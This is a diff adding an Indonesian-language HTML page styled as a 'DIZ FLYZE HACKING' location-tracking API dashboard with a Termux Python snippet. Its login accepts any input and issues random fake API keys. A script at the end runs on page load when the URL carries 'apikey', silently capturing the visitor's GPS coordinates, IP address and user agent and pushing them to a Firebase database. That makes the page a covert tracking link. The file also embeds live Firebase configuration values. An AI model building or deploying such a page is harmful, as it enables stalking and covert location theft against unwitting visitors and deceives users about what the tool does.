@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>DIZ FLYZE NO COUNTER</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+  <style>
+    :root {
+      --primary: #4A90E2;
+      --secondary: #50E3C2;
+      --bg: #f0f2f5;
+      --card-bg: rgba(255, 255, 255, 0.8);
+      --text: #333;
+      --shadow: rgba(0, 0, 0, 0.1);
+      --border-radius: 12px;
+    }
+    .dark-mode {
+      --primary: #4A90E2;
+      --secondary: #50E3C2;
+      --bg: #1e1e1e;
+      --card-bg: rgba(30, 30, 30, 0.9);
+      --text: #f0f0f0;
+      --shadow: rgba(0, 0, 0, 0.5);
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+      transition: background 0.3s, color 0.3s;
+    }
+    .container {
+      width: 100%;
+      max-width: 500px;
+      position: relative;
+    }
+    .page {
+      background: var(--card-bg);
+      backdrop-filter: blur(10px);
+      border-radius: var(--border-radius);
+      box-shadow: 0 4px 15px var(--shadow);
+      padding: 30px;
+      margin-bottom: 20px;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity 0.4s ease, transform 0.4s ease;
+      position: absolute;
+      width: 100%;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+    }
+    .page.active {
+      opacity: 1;
+      transform: translateY(0);
+      position: relative;
+      pointer-events: auto;
+    }
+    h2, h3 {
+      font-weight: 700;
+      margin-bottom: 20px;
+      text-align: center;
+      color: var(--primary);
+    }
+    p {
+      font-size: 1.1em;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+    a {
+      color: var(--primary);
+      text-decoration: none;
+      transition: color 0.3s;
+    }
+    a:hover { color: var(--secondary); }
+    .logo-circle {
+      width: 100px;
+      height: 100px;
+      margin: 0 auto 20px;
+      border-radius: 20%;
+      background-image: url('https://i.ibb.co/BVSkxm1M/e93bc4cf17f5.webp');
+      background-size: cover;
+      background-position: center;
+      box-shadow: 0 0 20px var(--secondary);
+      transition: transform 0.3s;
+    }
+    .logo-circle:hover { transform: scale(1.1); }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+    input[type="email"],
+    input[type="password"] {
+      padding: 15px;
+      border: none;
+      border-radius: var(--border-radius);
+      background: rgba(255,255,255,0.9);
+      box-shadow: 0 2px 8px var(--shadow);
+      font-size: 1em;
+      transition: box-shadow 0.3s;
+    }
+    input[type="email"]:focus,
+    input[type="password"]:focus {
+      outline: none;
+      box-shadow: 0 2px 12px var(--primary);
+    }
+    button {
+      padding: 15px;
+      border: none;
+      border-radius: var(--border-radius);
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: #fff;
+      font-size: 1em;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 4px 12px var(--shadow);
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 6px 16px var(--shadow);
+    }
+    .info-text {
+      text-align: center;
+      font-size: 0.95em;
+      color: #e74c3c;
+    }
+    .card {
+      background: var(--card-bg);
+      border-radius: var(--border-radius);
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 12px var(--shadow);
+      transition: transform 0.3s;
+    }
+    .card:hover { transform: translateY(-5px); }
+    .card p {
+      text-align: left;
+      margin-bottom: 10px;
+    }
+    .code-container {
+      background: rgba(0,0,0,0.85);
+      padding: 20px;
+      border-radius: var(--border-radius);
+      margin-bottom: 20px;
+    }
+    pre {
+      background: #2d2d2d;
+      color: #f8f8f2;
+      padding: 15px;
+      border-radius: var(--border-radius);
+      overflow-x: auto;
+      font-size: 0.9em;
+      margin: 0;
+    }
+    #dark-mode-toggle {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: var(--primary);
+      color: #fff;
+      border: none;
+      padding: 10px 15px;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      box-shadow: 0 4px 12px var(--shadow);
+      transition: background 0.3s;
+      z-index: 100;
+    }
+    #dark-mode-toggle:hover { background: var(--secondary); }
+    .spinner {
+      margin: 30px auto;
+      width: 60px;
+      height: 60px;
+      border: 8px solid rgba(0,0,0,0.1);
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spin 1.5s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @media (max-width: 500px) {
+      .container { max-width: 100%; }
+      .page { padding: 20px; }
+    }
+  </style>
+</head>
+<body>
+  <button id="dark-mode-toggle">🔰</button>
+  <div class="container">
+    <div id="loading" class="page active">
+      <h2>🚀 DIZ FLYZE API 🚀</h2>
+      <p>Download Resource...</p>
+      <div class="spinner"></div>
+    </div>
+    <div id="login" class="page">
+      <div class="logo-circle"></div>
+      <p class="info-text">Saya Developer mengamankan setiap Api key, Anda perlu memahami menggunakan Apikey dan melakukan peretasan lokasi bisa memicu hukum pidana. Pahami sebelum menggunakan. Login di perlukan untuk identitas apikey anda.</p>
+      <form id="login-form">
+        <input type="email" id="email" placeholder="Email atau Nomor" required>
+        <input type="password" id="password" placeholder="Kata Sandi" required>
+        <button type="submit">Masuk</button>
+      </form>
+    </div>
+    <div id="dashboard" class="page">
+      <div class="logo-circle"></div>
+      <h2>💻 DIZ FLYZE HACKING 💻</h2>
+      <div class="card">
+        <h3>&lt;&lt; LOKASI ANDA &gt;&gt;</h3>
+        <p><strong>IP Anda:</strong> <span id="ip-you">-</span></p>
+        <p><strong>PROXY Anda:</strong> <span id="proxy">Tidak Terdeteksi</span></p>
+        <p><strong>GMaps:</strong> <a id="gmaps-link" href="#" target="_blank">-</a></p>
+        <p><strong>Longitude:</strong> <span id="longit">-</span></p>
+        <p><strong>Latitude:</strong> <span id="latitd">-</span></p>
+      </div>
+      <div class="card">
+        <h3>✅ API & TOKEN 🔰</h3>
+        <p><strong>API KEY:</strong> <span id="api-key">-</span></p>
+        <p><strong>TOKEN:</strong> <span id="token">-</span></p>
+        <p><strong>STATUS:</strong> <span id="status-aktif">AKTIF</span></p>
+      </div>
+      <button id="code-btn">TERMUX</button>
+    </div>
+    <div id="code-page" class="page">
+      <div class="logo-circle"></div>
+      <h2>👪 DIZ FLYZE APi 😈</h2>
+      <div class="code-container">
+        <p>Script untuk memanggil APi dan Token ke TERMUX.</p>
+        <pre id="code-snippet">
+#!/usr/bin/env python3
+import requests
+
+API_KEY = "YOUR_API_KEY"
+TOKEN = "YOUR_TOKEN"
+
+TRACK_LINK = f"https://dizflyzeapi.vercel.app/api/track?apikey={API_KEY}&token={TOKEN}"
+print("Link :", TRACK_LINK)
+
+response = requests.get(TRACK_LINK)
+print(response.text)
+        </pre>
+      </div>
+      <button id="back-btn">Kembali</button>
+    </div>
+  </div>
+  <script>
+    firebase.initializeApp({
+      apiKey: "AIzaSyDIOjpEtWakfh0WNCDC1iPj9Qm5zKDlaL4",
+      authDomain: "login-24767.firebaseapp.com",
+      databaseURL: "https://login-24767-default-rtdb.firebaseio.com",
+      projectId: "login-24767",
+      storageBucket: "login-24767.appspot.com",
+      messagingSenderId: "809521846306",
+      appId: "1:809521846306:web:ee8bc0fe4e07584bad127b"
+    });
+    const database = firebase.database();
+    function showPage(pageId) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(pageId).classList.add('active');
+    }
+    function randomString(length) {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+    function generateKeys() {
+      return { apiKey: randomString(32), token: randomString(16) };
+    }
+    function saveTrackingData(refPath, data) {
+      const dbRef = database.ref(refPath);
+      dbRef.push(data, error => {
+        if (error) { console.error(error); }
+      });
+    }
+    async function fetchIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch (error) { return 'unknown'; }
+    }
+    function fetchLocation() {
+      return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve(pos.coords),
+            err => reject(err)
+          );
+        } else {
+          reject(new Error('Geolocation not supported.'));
+        }
+      });
+    }
+    function listenTracking(identifier) {
+      const refPath = 'DizApiT/' + identifier;
+      const dbRef = database.ref(refPath);
+      dbRef.on('child_added', snapshot => { console.log(snapshot.val()); });
+    }
+    document.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => { showPage('login'); }, 2000);
+      setInterval(() => {
+        const keyTimestamp = localStorage.getItem('keyTimestamp');
+        const statusEl = document.getElementById('status-aktif');
+        if (keyTimestamp) {
+          const expirationTime = parseInt(keyTimestamp, 10) + 2 * 60 * 60 * 1000;
+          const timeLeft = expirationTime - Date.now();
+          if (timeLeft <= 0) {
+            statusEl.textContent = 'EXPIRED';
+            alert('Sesi Anda telah berakhir. Silakan login kembali untuk mendapatkan API key dan token baru.');
+            localStorage.removeItem('loggedIn');
+            localStorage.removeItem('apiKey');
+            localStorage.removeItem('token');
+            localStorage.removeItem('keyTimestamp');
+            showPage('login');
+          } else {
+            const hours = Math.floor(timeLeft / (1000 * 60 * 60));
+            const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+            statusEl.textContent = `AKTIF - ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+          }
+        } else {
+          statusEl.textContent = '-';
+        }
+      }, 1000);
+      document.getElementById('dark-mode-toggle').addEventListener('click', function() {
+        document.body.classList.toggle('dark-mode');
+        this.textContent = document.body.classList.contains('dark-mode') ? '👪' : '🚀';
+      });
+      document.getElementById('login-form').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        if(email && password) {
+          localStorage.setItem('loggedIn', 'true');
+          const keys = generateKeys();
+          localStorage.setItem('apiKey', keys.apiKey);
+          localStorage.setItem('token', keys.token);
+          localStorage.setItem('keyTimestamp', Date.now());
+          document.getElementById('api-key').textContent = keys.apiKey;
+          document.getElementById('token').textContent = keys.token;
+          const ip = await fetchIP();
+          document.getElementById('ip-you').textContent = ip;
+          document.getElementById('proxy').textContent = ip;
+          try {
+            const coords = await fetchLocation();
+            document.getElementById('longit').textContent = coords.longitude.toFixed(6);
+            document.getElementById('latitd').textContent = coords.latitude.toFixed(6);
+            const gmapsUrl = `https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
+            document.getElementById('gmaps-link').href = gmapsUrl;
+            document.getElementById('gmaps-link').textContent = 'Lihat Lokasi';
+            const identifier = ip.replace(/[.#$[\]]/g, '_');
+            listenTracking(identifier);
+          } catch (error) { console.error(error); }
+          showPage('dashboard');
+        } else { alert('Masukkan email dan password dengan benar.'); }
+      });
+      document.getElementById('code-btn').addEventListener('click', () => {
+        const apiKey = localStorage.getItem('apiKey') || 'YOUR_API_KEY';
+        const token = localStorage.getItem('token') || 'YOUR_TOKEN';
+        const snippet = `#!/usr/bin/env python3
+import requests
+
+API_KEY = "${apiKey}"
+TOKEN = "${token}"
+
+TRACK_LINK = f"https://dizflyzeapi.vercel.app/api/track?apikey={API_KEY}&token={TOKEN}"
+print("Link :", TRACK_LINK)
+
+response = requests.get(TRACK_LINK)
+print(response.text)`;
+        document.getElementById('code-snippet').textContent = snippet;
+        showPage('code-page');
+      });
+      document.getElementById('back-btn').addEventListener('click', () => { showPage('dashboard'); });
+    });
+    async function initTracking() {
+      try {
+        const coords = await fetchLocation();
+        const ip = await fetchIP();
+        const timestamp = Date.now();
+        const trackingData = {
+          latitude: coords.latitude,
+          longitude: coords.longitude,
+          ip: ip,
+          userAgent: navigator.userAgent,
+          timestamp: timestamp
+        };
+        const identifier = ip.replace(/[.#$[\]]/g, '_');
+        saveTrackingData('DIZAPI/' + identifier, trackingData);
+      } catch (err) { console.error(err); }
+    }
+    if (window.location.search.includes('apikey')) { initTracking(); }
+  </script>
+</body>
+</html>
